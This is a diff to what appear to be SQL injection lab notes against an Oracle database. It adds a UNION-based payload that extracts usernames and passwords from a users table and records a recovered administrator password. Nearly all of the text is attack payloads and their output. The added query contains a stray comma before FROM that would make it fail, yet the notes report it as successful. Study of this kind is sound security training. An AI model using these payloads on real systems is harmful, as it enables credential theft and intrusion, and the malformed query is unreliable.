@@ -34,3 +34,9 @@ There is a built-in table on Oracle called dual which you can use for this purpo
 5. Output column names from the selected table
     ' union select column_name, null from all_tab_columns where table_name='USERS_COOTLL'--
     Found >> USERNAME_STRAHH, PASSWORD_ZOOHUI
+
+6. Output usernames and passwords from columns
+    ' union select USERNAME_STRAHH, PASSWORD_ZOOHUI, from USERS_COOTLL--
+    Found >> administrator: wyimt8ict2kolft9gv9j
+
+
